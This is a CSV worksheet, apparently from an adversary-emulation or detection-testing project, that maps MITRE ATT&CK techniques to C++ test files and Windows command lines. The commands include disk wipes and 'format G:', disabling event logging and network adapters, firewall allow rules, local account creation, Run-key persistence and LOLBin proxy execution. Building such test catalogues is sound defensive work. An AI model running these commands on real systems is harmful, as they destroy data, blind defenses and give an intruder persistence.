Technique,,,,,Variants,Tactic,Technique,Approves,Link
T1106.000,,,,,,Execution,Native API,1,https://attack.mitre.org/techniques/T1106/
src,T1106.000.V1.cpp,,,,,,,,
T1113.000,,,,,,Collection,Screen Capture,1,https://attack.mitre.org/techniques/T1113/
src,T1113.000.V1.cpp,,,,,,,,
exec,"""snippingtool /clip""",,,,,,,,
T1124.000,,,,,,Discovery,System Time Discovery,1,https://attack.mitre.org/techniques/T1124/
exec,"""net time \\192.168.1.3 /set /yes""",,,,,,,,
T1132.001,,,,,,Command and Control,Data Encoding: Standard Encoding,1,https://attack.mitre.org/techniques/T1132/001/
src,T1132.001.V1.cpp,,,,,,,,
src,T1132.001.V2.cpp,,,,,,,,
T1132.002,,,,,,Command and Control,Data Encoding: Non-Standard Encoding,1,https://attack.mitre.org/techniques/T1132/002/
src,T1132.001.V1.cpp,,,,,,,,
src,T1132.001.V2.cpp,,,,,,,,
T1136.001,,,,,,Persistence,Create Account: Local Account,1,https://attack.mitre.org/techniques/T1136/001/
exec,"""/c net user /add test""",,,,,,,,
exec,"""net user /add abc""",,,,,,,,
T1216.001,,,,,,Defense Evasion,System Script Proxy Execution: PubPrn,1,https://attack.mitre.org/techniques/T1216/001/
exec,"""cscript.exe C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs 127.0.0.1 script \""cmd.exe /c calc.exe\""""",,,,,,,,
T1216.002,,,,,,Defense Evasion,System Script Proxy Execution: PubPrn,1,https://attack.mitre.org/techniques/T1216/002/
exec,"""wscript.exe C:\\Windows\\System32\\SyncAppvPublishingServer.vbs \""n; Get-Process | Out-File C:\\Temp\\process_list.txt\""""",,,,,,,,
T1489.000,,,,,,Impact,Service Stop,1,https://attack.mitre.org/techniques/T1489/
exec,"""powershell -Command \""Get-WmiObject-class Win32_NetworkAdapter | ForEach{ If($.NetEnabled) { $.Disable() } }\"" > NULL""",,,,,,,,
exec,"""C:\\Windows\\System32\\net.exe stop MSSQLSERVER""",,,,,,,,
T1547.001,,,,,Registry,Persistence,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,1,https://attack.mitre.org/techniques/T1547/001/
src,T1547.001.V1.cpp,,,,,,,,
src,T1547.001.V2.cpp,,,,,,,,
src,T1547.001.V3.cpp,,,,,,,,
src,T1547.001.V4.cpp,,,,,,,,
T1547.002,,,,,Registry,Persistence,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,1,https://attack.mitre.org/techniques/T1547/002/
src,T1547.002.V1.cpp,,,,,,,,
T1547.003,,,,,Registry,Persistence,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,1,https://attack.mitre.org/techniques/T1547/003/
src,T1547.003.V1.cpp,,,,,,,,
T1547.004,,,,,Registry,Persistence,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,1,https://attack.mitre.org/techniques/T1547/004/
src,T1547.004.V1.cpp,,,,,,,,
src,T1547.004.V2.cpp,,,,,,,,
src,T1547.004.V3.cpp,,,,,,,,
src,T1547.004.V4.cpp,,,,,,,,
src,T1547.004.V5.cpp,,,,,,,,
src,T1547.004.V6.cpp,,,,,,,,
T1561.002,,,,,,Impact,Disk Wipe: Disk Structure Wipe,1,https://attack.mitre.org/techniques/T1561/002/
exec,"""del /s /q Y:\\*""","""rmdir /s /q D:\\""",,,,,,,
T1562.002,,,,,"3 registry, 3 exec",Defense Evasion,Impair Defenses: Disable Windows Event Logging,1,https://attack.mitre.org/techniques/T1562/002/
exec,"""format G:""",,,,,,,,
src,T1562.002.V1.cpp,,,,,,,,
exec,"""sc config eventlog start=disabled""",,,,,,,,
src,T1562.002.V3.cpp,,,,,,,,
src,T1562.002.V4.cpp,,,,,,,,
src,T1562.002.V5.cpp,,,,,,,,
T1562.004,,,,,,Defense Evasion,Impair Defenses: Disable or Modify System Firewall,1,https://attack.mitre.org/techniques/T1562/004/
exec,"""netsh advfirewall firewall add rule name=\""some_rule\"" dir=in action=allow protocol=TCP localport=1256 program=\""C:\\x.exe\"" description=\""xxx\"" enable=yes""",,,,,,,,
exec,"""netsh advfirewall firewall delete rule name=\""My Rule\""""",,,,,,,,
T1564.001,,,,,,Defense Evasion,Hide Artifacts: Hidden Files and Directories,1,https://attack.mitre.org/techniques/T1564/001/
src,T1564.001.V1.cpp,,,,,,,,
exec,"""attrib +h C:\\temp\\x.exe""",,,,,,,,
T1564.003,,,,,,Defense Evasion,Hide Artifacts: Hidden Window,1,https://attack.mitre.org/techniques/T1564/003/
exec,"""powershell.exe -WindowStyle Hidden a.ps1""",,,,,,,,
T1614.001,,,,,1 registry,Discovery,System Location Discovery: System Language Discovery,1,https://attack.mitre.org/techniques/T1614/001/
src,T1614.001.V1.cpp,,,,,,,,
src,T1614.001.V2.cpp,,,,,,,,
src,T1614.001.V3.cpp,,,,,,,,
T1047.000,,,,,"wmic process call create ""notepad.exe""",Execution,Windows Management Instrumentation,TODO,https://attack.mitre.org/techniques/T1047/
,,,,,"wmic os get Caption,CSDVersion,OSArchitecture",,,TODO,
,,,,0,"Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, CSDVersion, OSArchitecture",,,TODO,
,,,,0,"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList ""notepad.exe""",,,TODO,
T1202,,,,0,QUERY: Software\Microsoft\Windows\CurrentVersion\Uninstall,,,TODO,https://attack.mitre.org/techniques/T1012/
T1546,TODO,,,0,,,,TODO,
T1078.003,0,0,1,0,net user,,,TODO,
T1497.001,0,1,1,1,"reg query ""HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions""",,,TODO,https://attack.mitre.org/techniques/T1497/001/
,,,,0,"dir ""C:\Windows\System32\drivers\vmmouse.sys""",,,TODO,
T1112,,1,0,1,"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d ""calc.exe"" /f",,,TODO,https://attack.mitre.org/techniques/T1112/
,,,,0,,,,TODO,
,,,,,REG.EXE ADD HKEY_LOCAL_MACHINE\Software\Classes\CLSID\<arbitrary CLSID>\InProcServer32 /V ThreadingModel /T REG_SZ /D Apartment /F,,,TODO,
,,,,,"daca iau date de pe alte articole -> sa pun de unde l-am luat, link-ul articolului lor ",,,TODO,
,,,,,https://redcanary.com/blog/threat-intelligence/blue-mockingbird-cryptominer/,,,TODO,
